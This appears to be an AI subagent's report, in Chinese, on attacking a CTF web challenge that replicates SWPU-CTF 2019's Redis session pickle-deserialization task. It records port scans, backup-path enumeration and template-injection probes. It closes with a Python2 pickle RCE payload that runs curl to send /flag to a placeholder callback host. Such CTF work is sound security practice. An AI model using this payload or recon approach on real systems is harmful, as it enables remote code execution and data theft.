## Branch Result
direction: redis-session-analysis
subagent_id: branch_002
status: INFEASIBLE

### 发现
- 目标页面与 SWPU-CTF 2019 `python简单题` 高度一致：`Deserialization Login/Register`，登录后源码注释为 `<!--没错就是这么简洁~Red*s-->`。
- Cookie 形态确认为服务端 session id 签名：`session=<uuid>.<hmac-like-sig>`。示例：`a717f39c-9c27-48cb-8add-985356e8d027.LyZjZ4TTpMB4H5kAKQRTS4Gaf4U`，`.` 前面的 UUID 对应历史 WP 中 Redis key `session:<uuid>` 的 id 部分。
- 公开 WP 路径为：外连 Redis，认证后 `set "session:<uuid>" "<pickle payload>"`，然后携带原 cookie 访问 HTTP 触发 Python pickle 反序列化 RCE。参考：https://nikoeurus.github.io/2019/12/09/SWPU-ctf/
- 当前实例关键断点：从本环境直连 `117.21.200.176:6379` 超时，未验证到可写 Redis。未发现 HTTP 侧 SSRF/URL-fetch、源码泄露、debug/console、备份文件等能替代 Redis 写入的入口。
- 用户名输入在已登录页按文本输出，不存在明显 SSTI；HTML 被转义。

### 命令和结果
```bash
curl -i -sS --max-time 10 http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/
```
结果：`200 OK`，标题 `Deserialization Login`，响应设置 `Set-Cookie: session=<uuid>.<sig>; ...`。

```bash
# 注册/登录一次性账号后携带登录 cookie 访问 /
```
结果：返回 `Welcome,<username>`，页面源码含注释 `<!--没错就是这么简洁~Red*s-->`。

```bash
getent hosts 9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com
```
结果：`117.21.200.176 node5.buuoj.cn 9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com`

```bash
nc -vz -w 3 117.21.200.176 6379
```
结果：`tcp timed out`，Redis 外网不可达或被过滤。

```bash
for path in /.git/HEAD /app.py /index.py /source /src /backup.zip /www.zip /admin /debug /console /config.py /flag /readme.txt; do ...; done
```
结果：全部 `404 232`，未发现常见源码/备份/debug 路径。

```bash
for path in /static/ /templates/ /requirements.txt /Dockerfile /docker-compose.yml /uwsgi.ini /gunicorn.conf.py; do ...; done
```
结果：全部 `404`，静态目录不列目录，部署文件未泄露。

```bash
# 注册用户名 x<timestamp>{{7*7}} 后登录访问 /
```
结果：页面显示 `Welcome,x<timestamp>{{7*7}}`，未执行模板表达式。

```bash
# 注册用户名 <b>x</b> 后登录访问 /
```
结果：页面显示 `Welcome,&lt;b&gt;x&lt;/b&gt;`，HTML 被转义。

### 结论
当前分支不建议标记 FEASIBLE：Redis/pickle 反序列化方向有明确历史解法，但本实例未找到 Redis 写入原语。若主线或其他分支能获得 `117.21.200.176:6379` 访问、Redis 密码、SSRF 到 `127.0.0.1:6379`，或任何可写 `session:<uuid>` 的入口，则立即可转为 FEASIBLE；PoC 方向为将 `session:<cookie点号前UUID>` 改写为 Python2 pickle RCE payload，例如 `cposix\nsystem\np1\n(S'curl -d "@/flag" <callback>'\np2\ntRp3\n.`，随后携带原 signed cookie 访问 `/` 触发反序列化。
